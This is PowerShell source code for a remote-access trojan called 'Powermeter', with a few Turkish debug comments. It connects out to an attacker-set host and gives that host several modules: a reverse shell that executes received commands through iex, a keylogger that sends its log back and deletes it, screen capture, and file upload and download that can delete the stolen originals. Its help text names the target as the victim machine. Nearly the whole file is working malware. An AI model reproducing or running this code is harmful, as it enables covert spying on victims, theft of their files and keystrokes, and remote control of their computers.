###### Screenshot
Function Grab-ScreenShot { 
 
        [cmdletbinding( 
                SupportsShouldProcess = $True, 
                DefaultParameterSetName = "screen", 
                ConfirmImpact = "low" 
        )] 
Param ( 
       [Parameter( 
            Mandatory = $False, 
            ParameterSetName = "screen", 
            ValueFromPipeline = $True)] 
            [switch]$screen, 
       [Parameter( 
            Mandatory = $False, 
            ParameterSetName = "window", 
            ValueFromPipeline = $False)] 
            [switch]$activewindow, 
       [Parameter( 
            Mandatory = $False, 
            ParameterSetName = "", 
            ValueFromPipeline = $False)] 
            [string]$file,  
       [Parameter( 
            Mandatory = $False, 
            ParameterSetName = "", 
            ValueFromPipeline = $False)] 
            [string] 
            [ValidateSet("bmp","jpeg","png")] 
            $imagetype = "bmp"                       
) 

# C# code 
$code = @' 
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
namespace ScreenShotDemo
{
    
    public class ScreenCapture
    {

    public void CaptureActiveWindowToFile(string filename, ImageFormat format) 
    { 
      Image img = CaptureWindow(User32.GetForegroundWindow()); 
      img.Save(filename,format); 
    } 

    public Image CaptureActiveWindow() 
    { 
      return CaptureWindow( User32.GetForegroundWindow() );
    }

        public Image CaptureScreen()
        {
            return CaptureWindow(User32.GetDesktopWindow());
        }

        public Image CaptureWindow(IntPtr handle)
        {
            IntPtr hdcSrc = User32.GetWindowDC(handle);
            // get the size
            User32.RECT windowRect = new User32.RECT();
            User32.GetWindowRect(handle,ref windowRect);
            int width = windowRect.right - windowRect.left;
            int height = windowRect.bottom - windowRect.top;
            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
            // create a bitmap we can copy it to,
            // using GetDeviceCaps to get the width/height
            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc,width,height); 
            IntPtr hOld = GDI32.SelectObject(hdcDest,hBitmap);
            GDI32.BitBlt(hdcDest,0,0,width,height,hdcSrc,0,0,GDI32.SRCCOPY);
            GDI32.SelectObject(hdcDest,hOld); 
            GDI32.DeleteDC(hdcDest);
            User32.ReleaseDC(handle,hdcSrc);
            // get a .NET image object for it
            Image img = Image.FromHbitmap(hBitmap);
            // free up the Bitmap object
            GDI32.DeleteObject(hBitmap);
            return img;
        }
       
        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format) 
        {
            Image img = CaptureWindow(handle);
            img.Save(filename,format);
        }
        
        public void CaptureScreenToFile(string filename, ImageFormat format) 
        {
            Image img = CaptureScreen();
            img.Save(filename,format);
        }

        private class GDI32
        {
            
            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
            [DllImport("gdi32.dll")]
            public static extern bool BitBlt(IntPtr hObject,int nXDest,int nYDest,
                int nWidth,int nHeight,IntPtr hObjectSource,
                int nXSrc,int nYSrc,int dwRop);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC,int nWidth, 
                int nHeight);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteObject(IntPtr hObject);
            [DllImport("gdi32.dll")]
            public static extern IntPtr SelectObject(IntPtr hDC,IntPtr hObject);
        }

       
        private class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }
            [DllImport("user32.dll")]
            public static extern IntPtr GetDesktopWindow();
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowDC(IntPtr hWnd);
            [DllImport("user32.dll")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd,IntPtr hDC);
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd,ref RECT rect);
	    [DllImport("user32.dll")] 
     	    public static extern IntPtr GetForegroundWindow();    
        }
    }
}
'@ 
#User Add-Type to import the code 
add-type $code -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' 
#Create the object for the Function 
$capture = New-Object ScreenShotDemo.ScreenCapture 
 
#Take screenshot of the entire screen 
If ($Screen) { 
    Write-Verbose "Taking screenshot of entire desktop" 
    #Save to a file 
    If ($file) { 
        If ($file -eq "") { 
            $file = "$pwd\image.bmp" 
            } 
        Write-Verbose "Creating screen file: $file with imagetype of $imagetype" 
        $capture.CaptureScreenToFile($file,$imagetype) 
        } 
    Else { 
        $capture.CaptureScreen() 
        } 
    } 
#Take screenshot of the active window     
If ($ActiveWindow) { 
    Write-Verbose "Taking screenshot of the active window" 
    #Save to a file 
    If ($file) { 
        If ($file -eq "") { 
            $file = "$pwd\image.bmp" 
            } 
        Write-Verbose "Creating activewindow file: $file with imagetype of $imagetype" 
        $capture.CaptureActiveWindowToFile($file,$imagetype) 
        }     
    Else { 
        $capture.CaptureActiveWindow() 
        }     
    }      
}    

######

###### Read & Write stream
function readCmdFromStream($stream) {
	$read = $stream.Read($bytes, 0, $bytes.Length)
	$data = $encoding.GetString($bytes,0, $read).Trim();
	return $data				
}

function writeConsoleTagToStream($consoleTag) {
	$msgByte = $encoding.GetBytes($consoleTag);
	$params[0].Write($msgByte,0,$msgByte.Length);
	$params[0].Flush();
}

function writeToStream($params) {
	$msgToSend = $params[1] + "`r`n" + $params[2];
	$msgByte = $encoding.GetBytes($msgToSend);
	$params[0].Write($msgByte,0,$msgByte.Length);
	$params[0].Flush();
}

######

###### Reverse Shell Job
$ReverseShellThread =  {

	Param (
        [string]$_LHOST,
        [string]$_LPORT
    	)

	function writeToStream($params) {
		$msgToSend = $params[1] + "`r`n" + $params[2];
		$msgByte = $encoding.GetBytes($msgToSend);
		$params[0].Write($msgByte,0,$msgByte.Length);
		$params[0].Flush();
	}
	
	$client = New-Object System.Net.Sockets.TCPClient($_LHOST,$_LPORT);	
	$stream=$client.GetStream();
	$encoding=(New-Object -TypeName System.Text.ASCIIEncoding)
	[byte[]]$bytes = 0..65535|%{0};
	
	while( $true )
	{
		while( $stream.DataAvailable )
		{
				$read = $stream.Read($bytes, 0, $bytes.Length)
				$data = $encoding.GetString($bytes,0, $read);
				$sendback = (iex $data 2>&1 | Out-String );
				$params=$stream,'', ($sendback + 'PS ' + (pwd).Path + '> ')
				writeToStream($params);		
		}
		sleep 0.5;
	}
}

########

######## File Sender Job
$SendFileThread =  {

	Param (
        [string]$FLHOST,
        [string]$FLPORT,
	[string]$FFile,
	[bool]$DELFILE
    	)

	#$file = 'C:\Users\'+$env:UserName+'\Documents\'+$FFile;
	$file = $FFile;
	$bytes = [System.IO.File]::ReadAllBytes($file);
	if($DELFILE) {
		Remove-Item -Path $file -Force
	}
	$client = New-Object System.Net.Sockets.TCPClient($FLHOST,$FLPORT);	
	$stream=$client.GetStream();
	$encoding=(New-Object -TypeName System.Text.ASCIIEncoding)
	$stream.Write($bytes,0,$bytes.Length);
	$stream.Flush();
	$client.close();
}

########

######## File Receiver Job
$ReceiveFileThread =  {

	Param (
        [string]$FLHOST,
        [string]$FLPORT,
	[string]$FFile
    	)

	$client = New-Object System.Net.Sockets.TCPClient($FLHOST,$FLPORT);	
	$stream=$client.GetStream();
	[byte[]] $bytes = @()	
	[byte[]]$buffer = 0..4096|%{0};
	while(($data = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
		$bytes+=@($buffer)
		#write-host "rekt"
	};
	[io.File]::WriteAllBytes($FFile,$bytes);
	$stream.Flush();
	$client.close();
}

########

######## Keylogger Job
$KeyLoggerThread = {

	Param (
        [string]$FLHOST,
        [string]$FLPORT,
	[string]$logFile,
	[bool]$DELFILE
    	)

	function Start-KeyLogger
	{
		Param ( 
       	    		[Parameter( 
           		Mandatory = $true, 
           		ParameterSetName = "default", 
            		ValueFromPipeline = $false)] 
            		[string]$logFile                  
		) 

		# Extern methods from DLL
	  	$externedMethodSignatures=@'
			[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
			public static extern short GetAsyncKeyState(int virtualKeyCode); 
			[DllImport("user32.dll", CharSet=CharSet.Auto)]
			public static extern int GetKeyboardState(byte[] keystate);
			[DllImport("user32.dll", CharSet=CharSet.Auto)]
			public static extern int MapVirtualKey(uint uCode, int uMapType);
			[DllImport("user32.dll", CharSet=CharSet.Auto)]
			public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

		# load methods and make members available
	  	$KeyLogAPI = Add-Type -MemberDefinition $externedMethodSignatures -Name 'Win32' -Namespace API -PassThru
    
  		# create output log file
  	 	$null = New-Item -Path $logFile -ItemType File -Force

	 	try
  	 	{

    			while ($true) {
      				Start-Sleep -Milliseconds 40
      
      				# scan all ASCII codes above 8
      				for ($ascii = 9; $ascii -le 254; $ascii++) {

        				# get current key state
        				$state = $KeyLogAPI::GetAsyncKeyState($ascii)

				        # is key pressed?
				        if ($state -eq -32767) {
				          $null = [console]::CapsLock  #####Capslock acik mi degil mi onu donuyor..

				          # translate scan code to real code
				          $virtualKey = $KeyLogAPI::MapVirtualKey($ascii, 3)

				          # get keyboard state for virtual keys
				          $kbstate = New-Object Byte[] 256
				          $checkkbstate = $KeyLogAPI::GetKeyboardState($kbstate)

				          # prepare a StringBuilder to receive input key
				          $mychar = New-Object -TypeName System.Text.StringBuilder

				          # translate virtual key
				          $success = $KeyLogAPI::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

				          if ($success) 
				          {
				            # add key to logger file
				            [System.IO.File]::AppendAllText($logFile, $mychar, [System.Text.Encoding]::Unicode) 
			        	  }
					}
				}
   	 		}
		}
		
		finally
  		{
				# send and remove logger file to attacker 
				$bytes = [System.IO.File]::ReadAllBytes($logFile);
				if($DELFILE) {
					Remove-Item -Path $logFile -Force
				}
				$client = New-Object System.Net.Sockets.TCPClient($FLHOST,$FLPORT);	
				$stream=$client.GetStream();
				$encoding=(New-Object -TypeName System.Text.ASCIIEncoding)
				$stream.Write($bytes,0,$bytes.Length);
				$stream.Flush();
				$client.close();
		}
	}

	Start-KeyLogger -logFile $logFile
}

########
#PS C:\Users\decoder\Desktop> Start-Powermeter -shost 192.168.214.1 -sport 9190 -flport 9192
	
######## Main Function
function Start-Powermeter {

#$SHOST='192.168.214.1'
#$SPORT=9190
#$FLPORT=9192;

        [cmdletbinding( 
                SupportsShouldProcess = $True, 
                DefaultParameterSetName = "default", 
                ConfirmImpact = "low" 
        )] 

	Param ( 
       	    	[Parameter( 
           	Mandatory = $true, 
           	ParameterSetName = "default", 
            	ValueFromPipeline = $false)] 
            	[string]$shost,                       
	
		[Parameter( 
           	Mandatory = $true, 
           	ParameterSetName = "default", 
            	ValueFromPipeline = $false)] 
            	[string]$sport,

		[Parameter( 
           	Mandatory = $true, 
           	ParameterSetName = "default", 
            	ValueFromPipeline = $false)] 
            	[string]$flport
	) 


$IPv4Pattern = @"
^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$
"@

$PortNumPattern = @"
^[1-9][0-9]{3}$
"@

	$client = New-Object System.Net.Sockets.TCPClient($SHOST,$SPORT);	
	$stream=$client.GetStream();
	$encoding=(New-Object -TypeName System.Text.ASCIIEncoding)
	[byte[]]$bytes = 0..65535|%{0};
	$info = '[+] '
	$console = 'Powermeter>'
	$sendbyte = $encoding.GetBytes($console);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
	$rState=1;


	while($rState)
	{
		while( $stream.DataAvailable )
		{

			$cmd = readCmdFromStream($stream)
			write-host $cmd

			if($cmd -eq "rshell") {
				$module=($console+"reverse_shell>");	
				writeConsoleTagToStream($module);

				while($true) {

					[string]$data = readCmdFromStream($stream);
					#$dataArr = $data -split ' '	
					write-host $data
	
					if($data -eq "run") {
						if($LHOST -and $LPORT) {
							$success=1;
							writeConsoleTagToStream($module);
							break;
						}
						else {
							$success=0;
							writeConsoleTagToStream("`r`n" + "`r`n"  + "Parameters" + "`r`n" + "=============" + "`r`n" + "`r`n");
							writeConsoleTagToStream("`t Name".PadRight(25,' ') + "`t`t`t Value" + "`r`n")
							writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
							writeConsoleTagToStream("`t LHOST".PadRight(25,' ') + "`t`t`t" + $LHOST + "`r`n")
							writeConsoleTagToStream("`t LPORT".PadRight(25,' ') + "`t`t`t" + $LPORT + "`r`n")
							$failMsg="[+] Failed to start reverse shell module. All parameters must be set.."
							$params=$stream,$failMsg,$module
							writeToStream($params);
						}	
					}
					elseif($data -eq "back") {
						$success=0;
						writeConsoleTagToStream($console);	
						break;
					}
						
					elseif(($posLHOST = $data.IndexOf("set LHOST="))  -eq 0) {
						$tmp=$data.Substring($posLHOST+'set LHOST='.length)
						if($tmp -match $IPv4Pattern) {
							$LHOST = $tmp
							$params=$stream,"[+]LHOST is set",$module
							writeToStream($params);
						} else {
							write-host "[+]Wrong ipv4 format!"
							$params=$stream,"[+]Wrong ipv4 format!",$module
							writeToStream($params);
						}						
						write-host $LHOST
					}
						
					elseif(($posLPORT = $data.IndexOf("set LPORT=")) -eq 0) {
						$LPORT = $data.Substring($posLPORT+'set LPORT='.length)
	
						$tmp=$data.Substring($posLPORT+'set LPORT='.length)
						if($tmp -match $PortNumPattern) {
							$LPORT = $tmp
							$params=$stream,"[+]LPORT is set",$module
							writeToStream($params);
	
						} else {
							write-host "[+]Wrong Port number format!"
							$params=$stream,"[+]Wrong Port number format!",$module
							writeToStream($params);
						}							
						write-host $LPORT
					}

					elseif($data -eq "show options") {
						write-host "opsiyonlaaaaar"
						Write-Options -ModuleNumber 1

					}
					else {	
						$params=$stream,"[+]Wrong command!",$module
						writeToStream($params);
						write-host "wrong command!"
					}
				}
					
				if($success) {
					$job = Start-Job -Name "ReverseShellJob" -ScriptBlock $ReverseShellThread -ArgumentList $LHOST,$LPORT
					write-host "aa"
					$params=$stream,'[+]TCP reverse shell',$console
					writeToStream($params);	
				}	

					if($LHOST) {Remove-Variable LHOST;}
					if($LPORT) {Remove-Variable LPORT;}						
			}


			elseif($cmd -eq "start keylogger") {
    				$logFile="$env:temp\keylogger.txt"
				$job = Start-Job -Name "CaptureKeyStrokesJob" -ScriptBlock $KeyLoggerThread -ArgumentList $SHOST,$FLPORT,$logFile,$true
				$params=$stream,"[+]KeyLogger is starting..",$console
				writeToStream($params);
			}

			elseif($cmd -eq "show jobs") {
				$activeJobs="Active jobs:"
				$activeJobs+=get-job | fl | out-string
				write-host $activeJobs						
				$msg = '[+]' + $activeJobs;
				$params=$stream,$msg,$console
				writeToStream($params);	
			}

			#### stop methods..
			elseif($cmd -eq "stop job -rs" -or $cmd -eq "stop job -reverseShell") {
				if ( [bool](get-job -Name "ReverseShellJob" -ea silentlycontinue) )
				{						
					stop-Job -Name "ReverseShellJob" | out-string
					remove-Job -Name "ReverseShellJob" | out-string
					$msg = '[+]ReverseShellJob is terminated..';
				}	
				else
				{
					$msg = '[+]ReverseShellJob is not running..';
				}		
				$params=$stream,$msg,$console
				writeToStream($params);
			}
			elseif($cmd -eq "stop job -sf" -or $cmd -eq "stop job -sendFile") {
				if ( [bool](get-job -Name "SendFileJob" -ea silentlycontinue) )
				{						
					stop-Job -Name "SendFileJob" | out-string
					remove-Job -Name "SendFileJob" | out-string
					$msg = '[+]SendFileJob is terminated..';
				}
				else
				{
					$msg = '[+]SendFileJob is not running..';
				}	
				$params=$stream,$msg,$console
				writeToStream($params);
			}
			elseif($cmd -eq "stop job -rf" -or $cmd -eq "stop job -receiveFile") {
				if ( [bool](get-job -Name "ReceiveFileJob" -ea silentlycontinue) )
				{						
					stop-Job -Name "ReceiveFileJob" | out-string
					remove-Job -Name "ReceiveFileJob" | out-string
					$msg = '[+]ReceiveFileJob is terminated..';
				}
				else
				{
					$msg = '[+]ReceiveFileJob is not running..';
				}	
				$params=$stream,$msg,$console
				writeToStream($params);
			}
			elseif($cmd -eq "stop job -keylogger" -or $cmd -eq "stop job -kl") {				
				if ( [bool](get-job -Name "CaptureKeyStrokesJob" -ea silentlycontinue) )
				{						
					stop-Job -Name "CaptureKeyStrokesJob" | out-string
					remove-Job -Name "CaptureKeyStrokesJob" | out-string
					$msg = '[+]Keylogger is terminated..';
				}
				else
				{
					$msg = '[+]Keylogger is not running..';
				}	
				$params=$stream,$msg,$console
				writeToStream($params);
			}

			elseif($cmd -eq "stop job -all") {
				$ctr=0;
				$jobs = @(
   					"ReverseShellJob";
    					"SendFileJob";
	   				"ReceiveFileJob";
					"CaptureKeyStrokesJob";
					"DoActualWork";
				)

				$jobs | foreach {
					if ([bool](get-job -Name $_ -ea silentlycontinue)) {
						$ctr=$ctr+1
						stop-Job -Name $_ | out-string
						remove-Job -Name $_ | out-string
						$msg = '[+]' + $_ + ' is terminated..';
						$params=$stream,$msg,$console
						writeToStream($params);
					}
				}

				if($ctr -eq 0)
				{						
					$msg = '[+]Job is not running..';
					$params=$stream,$msg,$console
					writeToStream($params);
				}
			}

			#### stop methods..			
			elseif($cmd -eq "exit") {				
				write-host "exitting.."
				$params=$stream,'[+]Exitting.. Bye!',$console
				writeToStream($params);
				$rState=0;
				$client.close();
				break;	
			}

			elseif($cmd -eq "screencap -screen" -or $cmd -eq "screencap -s") {
				$file='C:\Users\'+$env:UserName+'\Documents\'+'image1.png';
				Grab-ScreenShot -screen -file $file -imagetype png
				$job = Start-Job -Name "SendFileJob" -ScriptBlock $SendFileThread -ArgumentList $SHOST,$FLPORT,$file,$true
				$params=$stream,'[+]Screenshot saved..',$console
				writeToStream($params);
			}

			elseif($cmd -eq "screencap -activeWindow" -or $cmd -eq "screencap -a") {
				$file='C:\Users\'+$env:UserName+'\Documents\'+'image2.png';
				Grab-ScreenShot -activewindow -file $file -imagetype png
				$job = Start-Job -Name "SendFileJob" -ScriptBlock $SendFileThread -ArgumentList $SHOST,$FLPORT,$file,$true
				$params=$stream,'[+]Screenshot is saving..',$console
				writeToStream($params);
			}

			elseif(($posDownLoadPath = $cmd.IndexOf("download"))  -eq 0) {
				$file=$cmd.Substring($posDownLoadPath +'download'.length + 1)
				if([System.IO.File]::Exists($file)) {
					$params=$stream,"[+]File is downloading..",$console
					writeToStream($params);
					$job = Start-Job -Name "SendFileJob" -ScriptBlock $SendFileThread -ArgumentList $SHOST,$FLPORT,$file,$false
				} else {
					write-host "[+]Wrong path or file!"
					$params=$stream,"[+]Wrong path or file!",$console
					writeToStream($params);
				}						
			}

			elseif(($posUploadPath = $cmd.IndexOf("upload"))  -eq 0) {
				$file=$cmd.Substring($posUploadPath + 'upload'.length + 1)
				$params=$stream,"[+]File is uploading..",$console
				writeToStream($params);			
				$job = Start-Job -Name "ReceiveFileJob" -ScriptBlock $ReceiveFileThread -ArgumentList $SHOST,$FLPORT,$file
				#TODO: UPLoaD PaTH CORRECTNESS CHECK			
			}

			elseif(($posFLPORT = $cmd.IndexOf("set FLPORT="))  -eq 0) {
				$tmp=$cmd.Substring($posFLPORT+'set FLPORT='.length)
				if($tmp -match $PortNumPattern) {
					$FLPORT = $tmp
					$params=$stream,"[+]FLPORT is set",$console
					writeToStream($params);
				} else {
					write-host "[+]Wrong Port number format!"
					$params=$stream,"[+]Wrong Port number format!",$console
					writeToStream($params);
				}
						
				write-host $FLPORT
			}
			elseif($cmd -eq "show options") {
				Write-Options -ModuleNumber 0
			}
 						
			else {
				write-host "bu ne?";
				$params=$stream,'[+]Command is not known..',$console
				writeToStream($params);
				Write-Options -ModuleNumber 0
			}
		}
		sleep 0.75;
		#write-host "uyandim!"
	}
} #


function Write-Options {

	Param ( 
       	    	[Parameter( 
           	Mandatory = $true, 
           	ParameterSetName = "default", 
            	ValueFromPipeline = $false)] 
            	[int]$ModuleNumber                       
	)

	if($ModuleNumber -eq 0) {
		writeConsoleTagToStream("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n");
		writeConsoleTagToStream("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n")
		writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
		writeConsoleTagToStream("`t set FLPORT=<port>".PadRight(25,' ') + "`t`t`t Set file transfer port" + "`r`n")
		writeConsoleTagToStream("`t rshell".PadRight(25,' ') + "`t`t`t Open reverse shell module" + "`r`n")
		writeConsoleTagToStream("`t start keylogger".PadRight(25,' ') + "`t`t`t Start keylogger thread" + "`r`n")
		writeConsoleTagToStream("`t show jobs".PadRight(25,' ') + "`t`t`t Show all active threads" + "`r`n")
		writeConsoleTagToStream("`t stop job -keylogger".PadRight(25,' ') + "`t`t`t Stop keylogger thread and download captured keystrokes from file port" + "`r`n")	
		writeConsoleTagToStream("`t stop job -reverseShell".PadRight(25,' ') + "`t`t`t Stop reverse shell session and thread" + "`r`n")
		writeConsoleTagToStream("`t stop job -sendFile".PadRight(25,' ') + "`t`t`t Stop file downloading thread" + "`r`n")
		writeConsoleTagToStream("`t stop job -receiveFile".PadRight(25,' ') + "`t`t`t Stop file uploading thread" + "`r`n")
		writeConsoleTagToStream("`t stop job -all".PadRight(25,' ') + "`t`t`t Stop all active threads" + "`r`n")
		writeConsoleTagToStream("`t screencap -screen".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [WHOLE SCREEN] and download it" + "`r`n")
		writeConsoleTagToStream("`t screencap -activeWindow".PadRight(25,' ') + "`t`t`t Capture screenshot of victim machine [ACTIVE WINDOW] and download it" + "`r`n")
		writeConsoleTagToStream("`t download <fileFromVictim>".PadRight(25,' ') + "`t`t`t Download a file from victim machine.[<fileFromVictim>: An absolute file path in victim machine that the attacker downloads]" + "`r`n")
		writeConsoleTagToStream("`t upload <fileToVictim>".PadRight(25,' ') + "`t`t`t Upload a file to victim machine.[<fileToVictim>: An absolute file path in victim machine to store file uploaded by attacker]" + "`r`n")	
		writeConsoleTagToStream("`t exit".PadRight(25,' ') + "`t`t`t Exit the program" + "`r`n")
		writeConsoleTagToStream("`t Important: File transfer port should be opened in attacker's side to achieve download,uploading files." + "`r`n" + "`r`n") 
		writeConsoleTagToStream("Powershell>") 
	}
	elseif($ModuleNumber -eq 1) {
		writeConsoleTagToStream("`r`n" + "`r`n"  + "Options" + "`r`n" + "=============" + "`r`n" + "`r`n");
		writeConsoleTagToStream("`t Command".PadRight(25,' ') + "`t`t`t Description" + "`r`n")
		writeConsoleTagToStream("`t -------".PadRight(25,' ') + "`t`t`t -----------" + "`r`n")
		writeConsoleTagToStream("`t set LHOST=<IPv4>".PadRight(25,' ') + "`t`t`t Set local IP address" + "`r`n")
		writeConsoleTagToStream("`t set LPORT=<port>".PadRight(25,' ') + "`t`t`t Set local port address" + "`r`n")
		writeConsoleTagToStream("`t run".PadRight(25,' ') + "`t`t`t Start reverse shell" + "`r`n")
		writeConsoleTagToStream("`t back".PadRight(25,' ') + "`t`t`t Exit from reverse shell module" + "`r`n")
		writeConsoleTagToStream("Powershell>reverse_shell>") 
	}
}
#Powermeter>upload C:\Users\decoder\Desktop\getrekt.txt
